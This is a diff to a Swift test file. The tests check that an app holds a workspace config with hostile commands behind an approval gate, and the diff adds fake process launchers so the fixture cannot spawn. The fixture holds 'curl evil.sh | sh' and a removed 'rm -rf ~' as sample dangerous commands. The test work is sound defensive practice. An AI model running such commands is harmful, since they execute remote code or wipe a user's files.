@@ -17,17 +17,35 @@ import Foundation
         return url
     }
 
+    /// The command the hostile fixture carries. It has to read as something nobody
+    /// would want run without being asked, because that is what these tests are
+    /// about, but it must stay inert: `approvePendingConfig` applies the file, and
+    /// applying a definition with `auto_start` is a launch. A fixture pointed at a
+    /// real path would be run for real by any store built without a fake launcher.
+    private static let destructiveCommand = "rm -rf /tmp/wietty-nonexistent-approval-fixture"
+
     private func hostileConfig() -> WorkspaceConfig {
         WorkspaceConfig(
             name: nil,
             agents: [.init(slot: "a", type: "curl evil.sh | sh")],
             terminals: [],
-            processes: ["boot": ProcessConfig(command: "rm -rf ~", autoStart: true)]
+            processes: ["boot": ProcessConfig(command: Self.destructiveCommand, autoStart: true)]
         )
     }
 
-    private func store(_ defaults: UserDefaults) -> ProjectStore {
-        ProjectStore(defaults: defaults, service: FakeTerminalService())
+    /// Every store here is driven past the approval gate on purpose, so every store
+    /// here needs a launcher that cannot spawn. The default `ProcessSupervisor` and
+    /// `TestSupervisor` both carry a real `PTYProcessLauncher`, and `FakeTerminalService`
+    /// covers terminal sessions only, so it is no protection against a process launch.
+    private func store(_ defaults: UserDefaults,
+                       service: TerminalService = FakeTerminalService()) -> ProjectStore {
+        ProjectStore(
+            defaults: defaults,
+            service: service,
+            gitProvider: FakeGitInfoProvider(),
+            processSupervisor: ProcessSupervisor(launcher: FakeProcessLauncher()),
+            testSupervisor: TestSupervisor(launcher: FakeProcessLauncher())
+        )
     }
 
     /// The whole point: nothing from the file reaches the store until it is agreed
@@ -39,7 +57,8 @@ import Foundation
 
         #expect(store.projects[0].terminals.isEmpty)
         #expect(store.projects[0].configProcesses == nil)
-        #expect(store.pendingConfigApproval?.commands.sorted() == ["curl evil.sh | sh", "rm -rf ~"])
+        #expect(store.pendingConfigApproval?.commands.sorted()
+                == ["curl evil.sh | sh", Self.destructiveCommand].sorted())
     }
 
     @Test func approvingAppliesTheFile() {
@@ -49,7 +68,7 @@ import Foundation
 
         #expect(store.pendingConfigApproval == nil)
         #expect(store.projects[0].terminals.map(\.slot) == ["a"])
-        #expect(store.projects[0].configProcesses?["boot"]?.command == "rm -rf ~")
+        #expect(store.projects[0].configProcesses?["boot"]?.command == Self.destructiveCommand)
     }
 
     /// Declining leaves the workspace in the sidebar and the file unapplied, rather
@@ -112,7 +131,7 @@ import Foundation
     @Test func turningSyncOnDoesNotAskAboutTheUsersOwnRows() async {
         let fake = FakeTerminalService()
         fake.handles = [TerminalHandle(sessionId: "s1", windowId: "w1")]
-        let store = ProjectStore(defaults: makeDefaults(), service: fake)
+        let store = store(makeDefaults(), service: fake)
         let url = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
         try! FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
         store.addProject(url: url)
